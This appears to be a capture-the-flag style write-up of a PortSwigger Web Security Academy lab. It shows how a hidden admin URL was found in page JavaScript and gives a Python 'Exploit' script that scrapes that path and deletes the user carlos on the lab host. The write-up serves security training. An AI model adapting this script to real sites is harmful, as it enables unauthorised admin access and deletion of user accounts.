# Lab: Unprotected admin functionality with unpredictable URL

This lab has an unprotected admin panel. It's located at an unpredictable location, but the location is disclosed somewhere in the application.

Solve the lab by accessing the admin panel, and using it to delete the user carlos. 

---

We identified the `admin` by viewing the source code of the main page:  
![image](https://github.com/user-attachments/assets/2ae50dd3-2d6e-42ee-b8e7-c903a698975b)  

After accessing the `admin` panel:  
![image](https://github.com/user-attachments/assets/b57ed200-35eb-4fff-bf83-db900978a9c0)  

We deleted the `carlos` user and successfully solved the lab:  
![image](https://github.com/user-attachments/assets/e205e32c-a263-48b4-950f-5fd1867ff486)  


- Exploit:
```python
from bs4 import BeautifulSoup
import re
import requests
import urllib3


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
session = requests.Session()
url = 'https://0a2d00c7035f67c185dd6206008e0083.web-security-academy.net'


resp = session.get(url, verify=False, proxies=proxies)

soup = BeautifulSoup(resp.text, 'html.parser')

script_tag = soup.find('script', string=lambda text: text and "setAttribute('href'," in text)

match = re.findall(r"setAttribute\('href',\s*'([^']+)'", script_tag.string)
admin_panel_url = ''.join(match)

admin_panel_url = url + admin_panel_url

resp = session.get(admin_panel_url, verify=False, proxies=proxies)

soup = BeautifulSoup(resp.content.decode(), 'html.parser')

delete_link = soup.find('a', href=lambda href: href and 'delete' in href and 'carlos' in href)

delete_url = delete_link['href']

final_url = url + delete_url

resp = session.get(final_url, verify=False, proxies=proxies)

if 'User deleted successfully!' in resp.content.decode():
    print('Lab solved')
```

